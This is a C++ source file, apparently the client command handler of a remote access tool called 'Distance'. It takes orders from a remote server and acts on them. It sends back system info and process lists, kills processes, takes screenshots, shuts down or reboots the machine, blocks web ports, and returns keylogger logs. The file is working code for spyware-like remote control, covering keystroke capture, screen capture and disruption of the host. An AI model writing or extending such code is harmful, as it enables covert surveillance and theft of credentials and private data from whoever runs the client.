//------------------------------------------------------------------------------
// ╔═══╗╔══╗╔═══╗╔════╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗
// ╚╗╔╗║╚╣─╝║╔═╗║║╔╗╔╗║║╔═╗║║║╚╗║║║╔═╗║║╔══╝
// ─║║║║─║║─║╚══╗╚╝║║╚╝║║─║║║╔╗╚╝║║║─╚╝║╚══╗
// ─║║║║─║║─╚══╗║──║║──║╚═╝║║║╚╗║║║║─╔╗║╔══╝
// ╔╝╚╝║╔╣─╗║╚═╝║──║║──║╔═╗║║║─║║║║╚═╝║║╚══╗
// ╚═══╝╚══╝╚═══╝──╚╝──╚╝─╚╝╚╝─╚═╝╚═══╝╚═══╝
// 
// Copyright Ⓒ 0xlay. All rights reserved.
// 
// This source file is licensed under the terms of MIT license.
// For details, please read the LICENSE file.
// 
// File: ClientHandler.cpp
// 
// Creator: 0xlay
// 
// Environment: User mode only
//
// Module: DistanceService.exe
//
//------------------------------------------------------------------------------

#include "ClientNetwork.hpp"
#include "ClientHandler.hpp"
#include "Json.hpp"
#include "Commands.hpp"

using namespace Distance::Utils;

namespace Distance::Network::Handler
{

    void Connect(
        std::shared_ptr<Client> client,
        Message& msg,
        [[maybe_unused]] const boost::system::error_code& ec
    )
    {
        if (ec)
        {
            LOG_INFO("The client failed to connect to the server! Error message: ",
                     ec.message());
            return;
        }
        
        client->asyncReceive(msg, Receive);
    }



    void Receive(
        std::shared_ptr<Client> client,
        Message& msg,
        const boost::system::error_code& ec,
        [[maybe_unused]] size_t size
    )
    {
        if (ec)
        {
            LOG_INFO("The client failed to receive message from the server! "
                     "Error message: ", ec.message());
            return;
        }

        try
        {
            switch (msg.getMsgType())
            {

            //
            // SysInfo
            //
            case MsgType::GetSysInfo:
            {
                LOG_INFO("Client was receiving the GetSysInfo request from server!");

                auto sysInfo = Command::GetInfo().execute().pickUp();

                Json::PcInfo pcInfo;
                pcInfo.ip = std::move(sysInfo.localIp);
                pcInfo.localName = std::move(sysInfo.localName);

                pcInfo.cpu.architecture = std::move(sysInfo.cpu.architecture);
                pcInfo.cpu.name = std::move(sysInfo.cpu.name);

                pcInfo.ram.AvailMemory = sysInfo.ram.AvailMemory;
                pcInfo.ram.MemoryLoad = sysInfo.ram.MemoryLoad;
                pcInfo.ram.TotalMemory = sysInfo.ram.TotalMemory;

                msg << Json::pack(pcInfo);
                
                if (!client->send(msg))
                {
                    LOG_INFO("The client failed to send message "
                             "\'MsgType::SysInfo\' to the server!");
                    return;
                }
                break;
            }

            //
            // ProcessManager
            //
            case MsgType::GetProcessList:
            {
                LOG_INFO("Client was receiving the GetProcessList request from server!");


                msg << Json::pack(Command::ProcessList().execute().pickUp());
                
                if (!client->send(msg))
                {
                    LOG_INFO("The client failed to send message "
                             "\'MsgType::ProcessList\' to the server!");
                    return;
                }
                
                break;
            }
            case MsgType::TerminateProcess:
            {
                LOG_INFO("Client was receiving the TerminateProcess request from server!");
                DWORD pid = 0;

                if (!client->receive(msg))
                {
                    LOG_INFO("The client failed to receive message "
                             "\'MsgType::TerminateProcess\' from the server!");
                    return;
                }

                msg >> pid;

                Command::Terminate(pid).execute();

                msg << "The process [" << std::to_string(pid) << "] was terminated!";
                if (!client->send(msg))
                {
                    LOG_INFO("The client failed to send message "
                             "\'MsgType::TerminateProcess\' to the server!");
                    return;
                }
                break;
            }



            //
            // Screenshot
            //
            case MsgType::GetScreenshot:
            {
                LOG_INFO("Client was receiving the GetScreenshot request from server!");

                msg << Command::CreateScreenshot().execute().pickUp();
                if (!client->send(msg))
                {
                    LOG_INFO("The client failed to send message "
                             "\'MsgType::GetScreenshot\' to the server!");
                    return;
                }

                break;
            }



            //
            // PowerManager
            //
            case MsgType::ShutdownPC:
            {
                LOG_INFO("Client was receiving the ShutdownPC request from server!");

                Command::ShutdownPc().execute();

                msg << "The pc was shutdown!";
                if (!client->send(msg))
                {
                    LOG_INFO("The client failed to send message "
                             "\'MsgType::ShutdownPC\' to the server!");
                    return;
                }
                
                break;
            }
            case MsgType::RebootPC:
            {
                LOG_INFO("Client was receiving the RebootPC request from server!");

                Command::RebootPc().execute();

                msg << "The pc was reboot!";
                if (!client->send(msg))
                {
                    LOG_INFO("The client failed to send message "
                             "\'MsgType::RebootPC\' to the server!");
                    return;
                }

                break;
            }



            //
            // Keylogger
            //
            case MsgType::GetKeyLoggerLogs:
            {
                LOG_INFO("Client was receiving the GetKeyLoggerLogs request from server!");
                
                msg << Command::GetKeyloggerLog().execute().pickUp();
                
                if (!client->send(msg))
                {
                    LOG_INFO("The client failed to send message "
                             "\'MsgType::GetKeyLoggerLogs\' to the server!");
                    return;
                }
                break;
            }



            //
            // Netfilter
            //
            case MsgType::BlockTcpPorts:
            {
                LOG_INFO("Client was receiving the BlockTcpPorts request from server!");

                //
                // Netfilter demo version
                //

                std::vector<UINT16> ports {80, 443};

                Command::BlockTcpPorts(ports).execute();

                msg << "The TCP ports were blocked!";
                if (!client->send(msg))
                {
                    LOG_INFO("The client failed to send message "
                        "\'MsgType::BlockTcpPorts\' to the server!");
                    return;
                }
                break;
            }
            case MsgType::UnblockTcpPorts:
            {
                LOG_INFO("Client was receiving the UnblockTcpPorts request from server!");

                Command::UnblockTcpPorts().execute();

                msg << "The TCP ports were unblocked!";
                if (!client->send(msg))
                {
                    LOG_INFO("The client failed to send message "
                        "\'MsgType::UnblockTcpPorts\' to the server!");
                    return;
                }
                break;
            }


            default:
                LOG_INFO("The client received unknown message from the server!");
            }
        }
        catch (const std::exception& ex)
        {
            msg.clear();

            msg.setMsgType(MsgType::Error);
            msg.markAsErrorMsg();

            msg << ex.what();
            client->send(msg);

            LOG_INFO(ex.what());
        }

        LOG_INFO("Client was answering on message from server!");
        msg.clear();
        client->asyncReceive(msg, Receive);
    }

} // Distance::Network::Handler
